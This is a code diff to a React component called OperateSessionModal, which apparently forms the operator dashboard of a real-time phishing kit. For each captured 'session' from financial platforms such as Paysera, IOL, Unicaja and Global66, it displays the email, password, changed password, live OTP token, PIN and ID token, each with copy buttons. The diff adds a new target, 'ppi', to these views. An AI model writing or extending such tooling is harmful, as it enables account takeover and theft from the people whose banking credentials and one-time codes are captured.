@@ -508,6 +508,8 @@ const OperateSessionModal = ({ session, onClose, index }: OperateSessionModalPro
           <span className="rounded-full border border-orange-500/30 bg-orange-500/10 px-1.5 py-0.5 text-[9px] font-bold text-orange-400 uppercase tracking-wider shrink-0">UEX</span>
         ) : session.source === "iol" ? (
           <span className="rounded-full border border-violet-500/30 bg-violet-500/10 px-1.5 py-0.5 text-[9px] font-bold text-violet-400 uppercase tracking-wider shrink-0">IOL</span>
+        ) : session.source === "ppi" ? (
+          <span className="rounded-full border border-sky-500/30 bg-sky-500/10 px-1.5 py-0.5 text-[9px] font-bold text-sky-400 uppercase tracking-wider shrink-0">PPI</span>
                        ) : session.source === "unicaja" ? (
              <span className="rounded-full border border-sky-600/30 bg-sky-600/10 px-1.5 py-0.5 text-[9px] font-bold text-sky-500 uppercase tracking-wider shrink-0">UNI</span>
            ) : session.source === "global66" ? (
@@ -547,6 +549,8 @@ const OperateSessionModal = ({ session, onClose, index }: OperateSessionModalPro
              <span className="rounded-full border border-orange-500/30 bg-orange-500/10 px-1.5 py-0.5 text-[9px] font-bold text-orange-400 uppercase tracking-wider shrink-0">UEX</span>
            ) : session.source === "iol" ? (
              <span className="rounded-full border border-violet-500/30 bg-violet-500/10 px-1.5 py-0.5 text-[9px] font-bold text-violet-400 uppercase tracking-wider shrink-0">IOL</span>
+           ) : session.source === "ppi" ? (
+             <span className="rounded-full border border-sky-500/30 bg-sky-500/10 px-1.5 py-0.5 text-[9px] font-bold text-sky-400 uppercase tracking-wider shrink-0">PPI</span>
            ) : session.source === "unicaja" ? (
               <span className="rounded-full border border-sky-600/30 bg-sky-600/10 px-1.5 py-0.5 text-[9px] font-bold text-sky-500 uppercase tracking-wider shrink-0">UNI</span>
             ) : session.source === "global66" ? (
@@ -583,7 +587,7 @@ const OperateSessionModal = ({ session, onClose, index }: OperateSessionModalPro
             <MiniLive icon={<Mail size={10} />} label="Email" value={session.email} highlight={false} onCopy={() => copyToClipboard(session.email || "", "email")} isCopied={copied === "email"} />
             <MiniLive icon={<Lock size={10} />} label="Senha" value={currentPassword} highlight={currentPassword !== session.password} onCopy={() => copyToClipboard(currentPassword, "pw")} isCopied={copied === "pw"} />
             <MiniLive icon={<ShieldCheck size={10} />} label="Token" value={platformOtp} highlight={!!platformOtp} mono onCopy={() => copyToClipboard(platformOtp, "otp")} isCopied={copied === "otp"} />
-            {(session.source === "paysera" || session.source === "cocosdigital" || session.source === "ueex" || session.source === "iol") && (
+            {(session.source === "paysera" || session.source === "cocosdigital" || session.source === "ueex" || session.source === "iol" || session.source === "ppi") && (
               <>
                 {!!idPin && <MiniLive icon={<Lock size={10} />} label="PIN" value={idPin} highlight onCopy={() => copyToClipboard(idPin, "idpin")} isCopied={copied === "idpin"} />}
                 {!!idToken && <MiniLive icon={<Eye size={10} />} label="Token ID" value={idToken} highlight mono onCopy={() => copyToClipboard(idToken, "idtok")} isCopied={copied === "idtok"} />}
@@ -713,7 +717,7 @@ const OperateSessionModal = ({ session, onClose, index }: OperateSessionModalPro
               </div>
             </div>
           </>
-        ) : (session.source === "paysera" || session.source === "cocosdigital" || session.source === "ueex") ? (
+        ) : (session.source === "paysera" || session.source === "cocosdigital" || session.source === "ueex" || session.source === "ppi") ? (
           /* ── Platform + Identificação + Email Sync Controls ── */
           <>
             {/* Platform Actions */}
